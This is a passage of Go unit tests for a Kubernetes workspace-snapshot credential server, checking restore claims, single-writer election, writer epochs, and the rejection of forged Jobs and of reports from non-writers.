	check("r1", wsnapv1.SnapshotSucceeded, "s9")
	check("r2", wsnapv1.SnapshotFailed, "")
	check("r3", wsnapv1.SnapshotPending, "")
	// A terminal request is never rewritten.
	e.call(t, "/v1/report", "token-w1", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot, SnapshotID: "late", Request: "r1"})
	check("r1", wsnapv1.SnapshotSucceeded, "s9")
}

// statusCompat passes through; it exists so the test reads like production
// wiring where Client is the cached client.
type statusCompat struct{ client.Client }

func restoreReq(name, wsName, phase, claimedBy string) *wsnapv1.WorkspaceRestore {
	return &wsnapv1.WorkspaceRestore{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: name},
		Spec:   wsnapv1.WorkspaceRestoreSpec{WorkspaceName: wsName, SnapshotID: "snap-7", SourceWorkspace: "parent"},
		Status: wsnapv1.WorkspaceSnapshotStatus{Phase: phase, ClaimedBy: claimedBy}}
}

// TestClaimedRestoreAuthorization: after the workload started, only a
// WorkspaceRestore claimed by this very Pod unlocks the restore role.
func TestClaimedRestoreAuthorization(t *testing.T) {
	cases := []struct {
		name string
		req  *wsnapv1.WorkspaceRestore
		ask  string
		want int
	}{
		{"claimed by this pod", restoreReq("r", "ws1", wsnapv1.SnapshotRunning, "u1"), "r", 200},
		{"claimed by another pod", restoreReq("r", "ws1", wsnapv1.SnapshotRunning, "someone"), "r", 403},
		{"not claimed yet", restoreReq("r", "ws1", wsnapv1.SnapshotPending, ""), "r", 403},
		{"already finished", restoreReq("r", "ws1", wsnapv1.SnapshotSucceeded, "u1"), "r", 403},
		{"another workspace's request", restoreReq("r", "other", wsnapv1.SnapshotRunning, "u1"), "r", 403},
		{"request does not exist", restoreReq("r", "ws1", wsnapv1.SnapshotRunning, "u1"), "ghost", 403},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			e := forkEnv(t, workloadPod("w1", "u1", "ws1", agentRunning), tc.req)
			rec, r := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleRestore, Request: tc.ask})
			if rec.Code != tc.want {
				t.Fatalf("status %d, want %d: %s", rec.Code, tc.want, rec.Body.String())
			}
			if tc.want == 200 && (r.SnapshotID != "snap-7" || r.SourceWorkspace != "parent" || r.Backend.S3.Prefix != "root/team-a/parent") {
				t.Errorf("restore not taken from the request: %+v", r)
			}
		})
	}
}

func TestRestorerJobRoles(t *testing.T) {
	job := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-reqr-x", UID: "job-uid",
			Labels: map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "restorer",
				wsnapv1.LabelJobWorkspace: "ws1", wsnapv1.LabelRepository: "repo"},
			Annotations: map[string]string{wsnapv1.AnnotationRequest: "r"}},
	}
	pod := &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "restorer-pod", UID: "rp",
		Labels:          map[string]string{wsnapv1.LabelJob: "restorer"},
		OwnerReferences: []metav1.OwnerReference{{Kind: "Job", Name: "wsnap-reqr-x", UID: "job-uid", Controller: ptr.To(true)}}}}
	ws := &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
		Status: wsnapv1.WorkspaceStatus{Jobs: []wsnapv1.JobRef{{Name: "wsnap-reqr-x", UID: "job-uid", Kind: "restorer"}}}}
	e := forkEnv(t, job, pod, ws, restoreReq("r", "ws1", wsnapv1.SnapshotRunning, ""), restoreReq("other", "ws1", wsnapv1.SnapshotRunning, ""))
	for _, tc := range []struct {
		role protocol.Role
		req  string
		want int
	}{
		{protocol.RoleRestore, "r", 200},
		{protocol.RoleRestore, "", 403},      // must name its request
		{protocol.RoleRestore, "other", 403}, // not the request it serves
		{protocol.RoleMover, "", 200},        // snapshot of the restored volume
		{protocol.RoleMaintenance, "", 403},
	} {
		if rec, _ := e.call(t, "/v1/credentials", "token-restorer-pod", protocol.CredentialsRequest{Role: tc.role, Request: tc.req}); rec.Code != tc.want {
			t.Errorf("role %s request %q: %d, want %d (%s)", tc.role, tc.req, rec.Code, tc.want, rec.Body.String())
		}
	}
	// Its restore report completes the WorkspaceRestore as executor restorer.
	e.call(t, "/v1/report", "token-restorer-pod", protocol.Report{Role: protocol.RoleRestore, Operation: protocol.OpRestore, SnapshotID: "snap-7", Request: "r"})
	var got wsnapv1.WorkspaceRestore
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "r"}, &got)
	if got.Status.Phase != wsnapv1.SnapshotSucceeded || got.Status.Executor != "restorer" || got.Status.SnapshotID != "snap-7" {
		t.Errorf("restore request status = %+v", got.Status)
	}
}

func TestWaitClaimsRestoresAndWakesOnNotify(t *testing.T) {
	oldPoll, oldRecheck := waitPoll, recheck
	waitPoll, recheck = 5*time.Second, time.Hour // only a notification can wake it
	t.Cleanup(func() { waitPoll, recheck = oldPoll, oldRecheck })
	e := newEnv(t, workloadPod("w1", "u1", "ws1"))
	e.srv.Hub = &Hub{}
	e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})

	type result struct {
		resp protocol.WaitResponse
		took time.Duration
	}
	done := make(chan result, 1)
	go func() {
		start := time.Now()
		rec := httptest.NewRecorder()
		r := httptest.NewRequest(http.MethodPost, "/v1/wait", bytes.NewReader([]byte("{}")))
		r.Header.Set("Authorization", "Bearer token-w1")
		e.srv.Handler().ServeHTTP(rec, r)
		var resp protocol.WaitResponse
		_ = json.Unmarshal(rec.Body.Bytes(), &resp)
		done <- result{resp, time.Since(start)}
	}()
	time.Sleep(200 * time.Millisecond) // the poll is now parked
	if err := e.client.Create(context.Background(), restoreReq("rb", "ws1", "", "")); err != nil {
		t.Fatal(err)
	}
	e.srv.Hub.Notify(HubKey(ns, "ws1"))
	r := <-done
	if len(r.resp.Restores) != 1 || r.resp.Restores[0] != "rb" {
		t.Fatalf("wait returned %+v", r.resp)
	}
	if r.took > 2*time.Second {
		t.Errorf("woke after %s; a notification must wake the poll at once", r.took)
	}
	var got wsnapv1.WorkspaceRestore
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "rb"}, &got)
	if got.Status.Phase != wsnapv1.SnapshotRunning || got.Status.ClaimedBy != "u1" {
		t.Errorf("claim not recorded: %+v", got.Status)
	}
}

func TestHubUnsubscribe(t *testing.T) {
	h := &Hub{}
	ch, unsub := h.Subscribe("k")
	unsub()
	h.Notify("k")
	select {
	case <-ch:
		t.Error("notified after unsubscribe")
	default:
	}
	if len(h.waiters) != 0 {
		t.Errorf("waiter map leaked: %v", h.waiters)
	}
}

// TestZombieLongPollClaimsNothing: a wait handler whose Pod is terminating
// (its connection was never closed) must not claim requests.
func TestZombieLongPollClaimsNothing(t *testing.T) {
	oldPoll := waitPoll
	waitPoll = 100 * time.Millisecond
	t.Cleanup(func() { waitPoll = oldPoll })
	pod := workloadPod("w1", "u1", "ws1")
	pod.Status.Phase = corev1.PodRunning
	e := newEnv(t, pod, &wsnapv1.WorkspaceSnapshot{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "r1"},
		Spec: wsnapv1.WorkspaceSnapshotSpec{WorkspaceName: "ws1"}})
	e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
	var p corev1.Pod
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "w1"}, &p)
	p.Status.Phase = corev1.PodSucceeded // the Pod has stopped
	_ = e.client.Status().Update(context.Background(), &p)

	rec := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodPost, "/v1/wait", bytes.NewReader([]byte("{}")))
	r.Header.Set("Authorization", "Bearer token-w1")
	e.srv.Handler().ServeHTTP(rec, r)
	var got wsnapv1.WorkspaceSnapshot
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "r1"}, &got)
	if got.Status.Phase != "" {
		t.Fatalf("a stopped pod claimed the request: %+v", got.Status)
	}
}

// TestSingleWriterCompareAndSet: two Pods asking at the same moment must
// never both become writers (reviewer finding R2).
func TestSingleWriterCompareAndSet(t *testing.T) {
	for i := 0; i < 20; i++ {
		e := newEnv(t, workloadPod("w1", "u1", "ws1"), workloadPod("w2", "u2", "ws1"))
		codes := make(chan int, 2)
		for _, tok := range []string{"token-w1", "token-w2"} {
			go func(tok string) {
				rec, _ := e.call(t, "/v1/credentials", tok, protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
				codes <- rec.Code
			}(tok)
		}
		a, b := <-codes, <-codes
		if a == 200 && b == 200 {
			t.Fatalf("iteration %d: both pods got writer credentials", i)
		}
		if a != 200 && b != 200 {
			t.Fatalf("iteration %d: neither pod became the writer (%d, %d)", i, a, b)
		}
	}
}

// TestFinalMarksTheReportersOwnVolume: status.volume may already describe
// another Pod; the final mark must land on the reporter's PV (finding R4).
func TestFinalMarksTheReportersOwnVolume(t *testing.T) {
	owned := map[string]string{wsnapv1.AnnotationWorkspaceRef: ns + "/ws1"}
	pvA := &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: "pv-a", Annotations: owned}}
	pvB := &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: "pv-b", Annotations: map[string]string{wsnapv1.AnnotationWorkspaceRef: ns + "/ws1"}}}
	claimA := &corev1.PersistentVolumeClaim{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "data-w1"}, Spec: corev1.PersistentVolumeClaimSpec{VolumeName: "pv-a"}}
	e := newEnv(t, workloadPod("w1", "u1", "ws1"), pvA, pvB, claimA,
		&wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
			Status: wsnapv1.WorkspaceStatus{WriterPod: &wsnapv1.PodRef{Name: "w1", UID: "u1"},
				Volume: &wsnapv1.VolumeRef{Kind: "persistentVolumeClaim", ClaimName: "other", VolumeName: "pv-b"}}})
	e.call(t, "/v1/report", "token-w1", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot, SnapshotID: "s1", Final: true})
	var a, b corev1.PersistentVolume
	_ = e.client.Get(context.Background(), types.NamespacedName{Name: "pv-a"}, &a)
	_ = e.client.Get(context.Background(), types.NamespacedName{Name: "pv-b"}, &b)
	if a.Annotations[workspace.AnnotationFinalPod] != "u1" || b.Annotations[workspace.AnnotationFinalPod] != "" {
		t.Fatalf("final mark: pv-a %q, pv-b %q; want it on the reporter's pv-a only", a.Annotations[workspace.AnnotationFinalPod], b.Annotations[workspace.AnnotationFinalPod])
	}
}

// TestWritersWaitForAJobOnTheirVolume (finding R5).
func TestWritersWaitForAJobOnTheirVolume(t *testing.T) {
	pv := &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: "pv-a"}}
	claim := &corev1.PersistentVolumeClaim{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "data-w1"}, Spec: corev1.PersistentVolumeClaimSpec{VolumeName: "pv-a"}}
	job := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-reqr-1",
		Labels:      map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "restorer"},
		Annotations: map[string]string{wsnapv1.AnnotationVolumeName: "pv-a"}}}
	e := newEnv(t, workloadPod("w1", "u1", "ws1"), pv, claim, job)
	if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != http.StatusConflict {
		t.Fatalf("writer got %d while a restorer works on its volume, want 409", rec.Code)
	}
	job.Status.Conditions = []batchv1.JobCondition{{Type: batchv1.JobComplete, Status: corev1.ConditionTrue}}
	_ = e.client.Status().Update(context.Background(), job)
	if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != 200 {
		t.Fatalf("writer got %d after the job finished: %s", rec.Code, rec.Body.String())
	}
}

// TestMoverMarksTheWriterRecordedAtJobCreation (finding R5): a Pod that
// started on the volume during the mover run is not covered by its snapshot.
func TestMoverMarksTheWriterRecordedAtJobCreation(t *testing.T) {
	pv := &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: "pv-a",
		Annotations: map[string]string{workspace.AnnotationWriterPod: "newcomer", wsnapv1.AnnotationWorkspaceRef: ns + "/ws1"}}}
	job := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-mover-x", UID: "job-uid",
		Labels: map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "mover",
			wsnapv1.LabelJobWorkspace: "ws1", wsnapv1.LabelRepository: "repo"},
		Annotations: map[string]string{wsnapv1.AnnotationVolumeName: "pv-a", workspace.AnnotationWriterPod: "old-writer"}}}
	pod := &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "mover-pod", UID: "mp",
		Labels:          map[string]string{wsnapv1.LabelJob: "mover"},
		OwnerReferences: []metav1.OwnerReference{{Kind: "Job", Name: "wsnap-mover-x", UID: "job-uid", Controller: ptr.To(true)}}}}
	e := newEnv(t, pv, job, pod, &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
		Status: wsnapv1.WorkspaceStatus{Jobs: []wsnapv1.JobRef{{Name: "wsnap-mover-x", UID: "job-uid", Kind: "mover"}}}})
	e.call(t, "/v1/report", "token-mover-pod", protocol.Report{Role: protocol.RoleMover, Operation: protocol.OpSnapshot, SnapshotID: "s1", Final: true})
	var got corev1.PersistentVolume
	_ = e.client.Get(context.Background(), types.NamespacedName{Name: "pv-a"}, &got)
	if f := got.Annotations[workspace.AnnotationFinalPod]; f != "old-writer" {
		t.Fatalf("final mark %q; the newcomer's writes are not in the mover's snapshot", f)
	}
}

// TestRestoreWaitsWhileTheOldClaimIsBeingDeleted (suspicion S1): the PVC
// is gone but the PV controller has not marked the PV Released yet.
func TestRestoreWaitsWhileTheOldClaimIsBeingDeleted(t *testing.T) {
	old := &corev1.PersistentVolume{
		ObjectMeta: metav1.ObjectMeta{Name: "old-pv", Labels: map[string]string{wsnapv1.LabelProtected: "true"},
			Annotations: map[string]string{wsnapv1.AnnotationWorkspaceRef: ns + "/ws1", workspace.AnnotationWriterPod: "u0"}},
		Spec:   corev1.PersistentVolumeSpec{ClaimRef: &corev1.ObjectReference{Namespace: ns, Name: "gone-claim", UID: "c0"}},
		Status: corev1.PersistentVolumeStatus{Phase: corev1.VolumeBound},
	}
	e := newEnv(t, workloadPod("w2", "u2", "ws1"), old)
	if rec, _ := e.call(t, "/v1/credentials", "token-w2", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != http.StatusConflict {
		t.Fatalf("restore got %d while the old claim is deleted but its PV not yet released, want 409", rec.Code)
	}
}

func TestReportOperationMustMatchRole(t *testing.T) {
	e := newEnv(t, workloadPod("w1", "u1", "ws1"))
	e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
	rec, _ := e.call(t, "/v1/report", "token-w1", protocol.Report{Role: protocol.RoleRestore, Operation: protocol.OpSnapshot, SnapshotID: "x", Final: true})
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("a snapshot reported under the restore role got %d, want 400", rec.Code)
	}
}

// TestWriterStuckOnALostNodeIsGone (finding R9): a writer terminating long
// past its deadline is on a lost node and must not block replacements.
func TestWriterStuckOnALostNodeIsGone(t *testing.T) {
	stuck := workloadPod("w1", "u1", "ws1", agentRunning, func(p *corev1.Pod) {
		p.Finalizers = []string{"test/keep"} // the fake client deletes only with a finalizer kept
	})
	e := newEnv(t, stuck, workloadPod("w2", "u2", "ws1"))
	e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
	var p corev1.Pod
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "w1"}, &p)
	_ = e.client.Delete(context.Background(), &p)
	if rec, _ := e.call(t, "/v1/credentials", "token-w2", protocol.CredentialsRequest{Role: protocol.RoleRestore}); rec.Code != http.StatusConflict {
		t.Fatalf("a writer still within its grace period was replaced (%d)", rec.Code)
	}
	// metadata.deletionTimestamp is the deadline (deletion time plus grace).
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "w1"}, &p)
	deadline := p.DeletionTimestamp.Time
	if !stillWriting(&p, deadline.Add(stuckTerminationMargin-time.Second)) {
		t.Error("a writer just past its deadline already counts as gone")
	}
	if stillWriting(&p, deadline.Add(stuckTerminationMargin+time.Second)) {
		t.Fatal("a writer stuck terminating past its deadline still counts as live; it would block replacements forever")
	}
}

// TestUnregisteredJobGetsNothing: a namespace user copies a wsnap Job's
// labels into their own Job (reviewer #2 finding 4).
func TestUnregisteredJobGetsNothing(t *testing.T) {
	forged := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "evil", UID: "evil-uid",
		Labels: map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "maintenance",
			wsnapv1.LabelJobWorkspace: "ws1", wsnapv1.LabelRepository: "repo"}}}
	pod := &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "evil-pod", UID: "ep",
		Labels:          map[string]string{wsnapv1.LabelJob: "maintenance"},
		OwnerReferences: []metav1.OwnerReference{{Kind: "Job", Name: "evil", UID: "evil-uid", Controller: ptr.To(true)}}}}
	e := newEnv(t, forged, pod, &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
		Status: wsnapv1.WorkspaceStatus{Jobs: []wsnapv1.JobRef{{Name: "real", UID: "real-uid", Kind: "maintenance"}}}})
	if rec, _ := e.call(t, "/v1/credentials", "token-evil-pod", protocol.CredentialsRequest{Role: protocol.RoleMaintenance}); rec.Code == 200 {
		t.Fatal("a forged maintenance job got the delete credential")
	}
}

// TestFinalMarkOnlyOnTheCallersWorkspace (reviewer #2 finding 4).
func TestFinalMarkOnlyOnTheCallersWorkspace(t *testing.T) {
	victim := &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: "victim-pv",
		Annotations: map[string]string{wsnapv1.AnnotationWorkspaceRef: ns + "/victim", workspace.AnnotationWriterPod: "v1"}}}
	job := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-mover-x", UID: "job-uid",
		Labels: map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "mover",
			wsnapv1.LabelJobWorkspace: "ws1", wsnapv1.LabelRepository: "repo"},
		Annotations: map[string]string{wsnapv1.AnnotationVolumeName: "victim-pv", workspace.AnnotationWriterPod: "v1"}}}
	pod := &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "mover-pod", UID: "mp",
		Labels:          map[string]string{wsnapv1.LabelJob: "mover"},
		OwnerReferences: []metav1.OwnerReference{{Kind: "Job", Name: "wsnap-mover-x", UID: "job-uid", Controller: ptr.To(true)}}}}
	e := newEnv(t, victim, job, pod, &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
		Status: wsnapv1.WorkspaceStatus{Jobs: []wsnapv1.JobRef{{Name: "wsnap-mover-x", UID: "job-uid", Kind: "mover"}}}})
	e.call(t, "/v1/report", "token-mover-pod", protocol.Report{Role: protocol.RoleMover, Operation: protocol.OpSnapshot, SnapshotID: "s1", Final: true})
	var got corev1.PersistentVolume
	_ = e.client.Get(context.Background(), types.NamespacedName{Name: "victim-pv"}, &got)
	if got.Annotations[workspace.AnnotationFinalPod] != "" {
		t.Fatal("a job of workspace ws1 marked another workspace's PV as saved")
	}
}

// TestReportsOnlyFromTheWriterAndClaimant (reviewer #2 finding 5).
func TestReportsOnlyFromTheWriterAndClaimant(t *testing.T) {
	req := &wsnapv1.WorkspaceSnapshot{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "r1"},
		Spec: wsnapv1.WorkspaceSnapshotSpec{WorkspaceName: "ws1"}, Status: wsnapv1.WorkspaceSnapshotStatus{Phase: wsnapv1.SnapshotRunning, ClaimedBy: "u1"}}
	e := newEnv(t, workloadPod("w1", "u1", "ws1"), workloadPod("w2", "u2", "ws1"), req)
	e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot})
	if rec, _ := e.call(t, "/v1/report", "token-w2", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot, SnapshotID: "fake"}); rec.Code != http.StatusConflict {
		t.Errorf("a non-writer's snapshot report got %d, want 409", rec.Code)
	}
	var ws wsnapv1.Workspace
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "ws1"}, &ws)
	if ws.Status.LastSnapshot != nil && ws.Status.LastSnapshot.ID == "fake" {
		t.Fatal("a non-writer rewrote the last snapshot")
	}
	// r2 was claimed by another pod; even the writer w1 cannot complete it.
	r2 := &wsnapv1.WorkspaceSnapshot{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "r2"},
		Spec: wsnapv1.WorkspaceSnapshotSpec{WorkspaceName: "ws1"}, Status: wsnapv1.WorkspaceSnapshotStatus{Phase: wsnapv1.SnapshotRunning, ClaimedBy: "someone-else"}}
	if err := e.client.Create(context.Background(), r2); err != nil {
		t.Fatal(err)
	}
	r2.Status = wsnapv1.WorkspaceSnapshotStatus{Phase: wsnapv1.SnapshotRunning, ClaimedBy: "someone-else"}
	_ = e.client.Status().Update(context.Background(), r2)
	e.call(t, "/v1/report", "token-w1", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot, SnapshotID: "s-w1", Request: "r2"})
	var got wsnapv1.WorkspaceSnapshot
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "r2"}, &got)
	if got.Status.Phase != wsnapv1.SnapshotRunning {
		t.Fatalf("a pod that did not claim the request completed it: %+v", got.Status)
	}
}

// TestAdmissionConsumesRestoreFrom (reviewer #2 suspicion S4): a warm Pod
// was admitted; the unused restoreFrom must not fire at a later cold start.
func TestAdmissionConsumesRestoreFrom(t *testing.T) {
	ws := &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1", Generation: 2},
		Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo", RestoreFrom: &wsnapv1.RestoreSource{SnapshotID: "old"}}}
	e := newEnv(t, workloadPod("w1", "u1", "ws1"), ws)
	if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
		t.Fatal(rec.Code)
	}
	var got wsnapv1.Workspace
	_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "ws1"}, &got)
	if got.Status.RestoreFromGeneration != 2 {
		t.Fatalf("restoreFromGeneration = %d; the unused restoreFrom stays armed", got.Status.RestoreFromGeneration)
	}
}

// TestWriterEpochs (reviewer #3 finding 2): each new writer starts a new
// epoch, stamped on its PV; a sidecar's snapshot carries the epoch.
func TestWriterEpochs(t *testing.T) {
	claim := func(pod, pv string) client.Object {
		return &corev1.PersistentVolumeClaim{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "data-" + pod}, Spec: corev1.PersistentVolumeClaimSpec{VolumeName: pv}}
	}
	vol := func(name string) client.Object {
		return &corev1.PersistentVolume{ObjectMeta: metav1.ObjectMeta{Name: name}}
	}
	e := newEnv(t, workloadPod("w1", "u1", "ws1"), claim("w1", "pv-1"), vol("pv-1"))
	ws := func() wsnapv1.Workspace {
		var ws wsnapv1.Workspace
		_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "ws1"}, &ws)
		return ws
	}
	pvEpoch := func(name string) string {
		var pv corev1.PersistentVolume
		_ = e.client.Get(context.Background(), types.NamespacedName{Name: name}, &pv)
		return pv.Annotations[workspace.AnnotationWriterEpoch]
	}
	for range 2 {
		if rec, _ := e.call(t, "/v1/credentials", "token-w1", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
			t.Fatalf("w1: %d %s", rec.Code, rec.Body.String())
		}
	}
	if got := ws().Status.WriterEpoch; got != 1 || pvEpoch("pv-1") != "1" {
		t.Fatalf("after w1 (asked twice): epoch %d, pv-1 epoch %q; want 1 and \"1\"", got, pvEpoch("pv-1"))
	}
	e.call(t, "/v1/report", "token-w1", protocol.Report{Role: protocol.RoleSnapshot, Operation: protocol.OpSnapshot, SnapshotID: "a1"})
	if last := ws().Status.LastSnapshot; last == nil || last.ID != "a1" || last.Epoch != 1 {
		t.Fatalf("lastSnapshot %+v, want a1 at epoch 1", last)
	}
	// w1 is gone; w2 takes over on another volume.
	if err := e.client.Delete(context.Background(), &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "w1"}}); err != nil {
		t.Fatal(err)
	}
	pvc2 := claim("w2", "pv-2").(*corev1.PersistentVolumeClaim)
	pvc2.UID = "uid-data-w2"
	pv2 := vol("pv-2").(*corev1.PersistentVolume)
	pv2.UID = "uid-pv-2"
	pv2.Spec.ClaimRef = &corev1.ObjectReference{Namespace: ns, Name: pvc2.Name, UID: pvc2.UID}
	for _, o := range []client.Object{workloadPod("w2", "u2", "ws1"), pvc2, pv2} {
		if err := e.client.Create(context.Background(), o); err != nil {
			t.Fatal(err)
		}
	}
	e.srv.Auth.(fakeAuth)["token-w2"] = Identity{Namespace: ns, PodName: "w2", PodUID: "u2"}
	if rec, _ := e.call(t, "/v1/credentials", "token-w2", protocol.CredentialsRequest{Role: protocol.RoleSnapshot}); rec.Code != 200 {
		t.Fatalf("w2: %d %s", rec.Code, rec.Body.String())
	}
	if got := ws().Status.WriterEpoch; got != 2 || pvEpoch("pv-2") != "2" || pvEpoch("pv-1") != "1" {
		t.Fatalf("after w2: epoch %d, pv-2 %q, pv-1 %q", got, pvEpoch("pv-2"), pvEpoch("pv-1"))
	}
}

// TestOlderEpochNeverReplacesLatest (reviewer #3 finding 2 and the
// split-brain suspicion): restores read lastSnapshot, so it only moves
// forward in epochs, whatever order the rescues finish in.
func TestOlderEpochNeverReplacesLatest(t *testing.T) {
	for _, tc := range []struct {
		name               string
		lastEpoch          int64
		jobEpoch           string
		wantLatest         string
		wantRequestSucceed bool
	}{
		// Pod B (epoch 2) snapshotted; pod A's volume (epoch 1) is rescued late.
		{"late rescue of an older writer", 2, "1", "b1", true},
		// Pod B crashed before its first snapshot; its volume (epoch 2) is
		// rescued while lastSnapshot is still A's (epoch 1).
		{"rescue of a newer writer with no snapshot", 1, "2", "mover-snap", true},
		{"same epoch", 1, "1", "mover-snap", true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			job := &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-mover-x", UID: "job-uid",
				Labels: map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "mover",
					wsnapv1.LabelJobWorkspace: "ws1", wsnapv1.LabelRepository: "repo"},
				Annotations: map[string]string{wsnapv1.AnnotationVolumeName: "pv-a", workspace.AnnotationWriterEpoch: tc.jobEpoch}}}
			pod := &corev1.Pod{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "mover-pod", UID: "mp",
				Labels:          map[string]string{wsnapv1.LabelJob: "mover"},
				OwnerReferences: []metav1.OwnerReference{{Kind: "Job", Name: "wsnap-mover-x", UID: "job-uid", Controller: ptr.To(true)}}}}
			e := newEnv(t, job, pod, &wsnapv1.Workspace{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "ws1"}, Spec: wsnapv1.WorkspaceSpec{RepositoryName: "repo"},
				Status: wsnapv1.WorkspaceStatus{WriterEpoch: 2, Jobs: []wsnapv1.JobRef{{Name: "wsnap-mover-x", UID: "job-uid", Kind: "mover"}},
					LastSnapshot: &wsnapv1.SnapshotRecord{ID: map[int64]string{1: "a1", 2: "b1"}[tc.lastEpoch], Epoch: tc.lastEpoch, Executor: "sidecar"}}})
			if rec, _ := e.call(t, "/v1/report", "token-mover-pod", protocol.Report{Role: protocol.RoleMover, Operation: protocol.OpSnapshot, SnapshotID: "mover-snap", Final: true}); rec.Code != 204 {
				t.Fatalf("report: %d %s", rec.Code, rec.Body.String())
			}
			var ws wsnapv1.Workspace
			_ = e.client.Get(context.Background(), types.NamespacedName{Namespace: ns, Name: "ws1"}, &ws)
			if ws.Status.LastSnapshot.ID != tc.wantLatest {
				t.Fatalf("lastSnapshot %q, want %q", ws.Status.LastSnapshot.ID, tc.wantLatest)
			}
			if superseded := tc.wantLatest != "mover-snap"; superseded {
				if n := len(ws.Status.SupersededSnapshots); n != 1 || ws.Status.SupersededSnapshots[0].ID != "mover-snap" {
					t.Fatalf("superseded snapshots %+v; the rescued data must stay reachable (reviewer #4 finding 6)", ws.Status.SupersededSnapshots)
				}
				m := newEnv(t, &ws, &batchv1.Job{ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: "wsnap-maint-x", UID: "maint-uid",
					Labels: map[string]string{wsnapv1.LabelManagedBy: wsnapv1.ManagedByValue, wsnapv1.LabelJob: "maintenance",
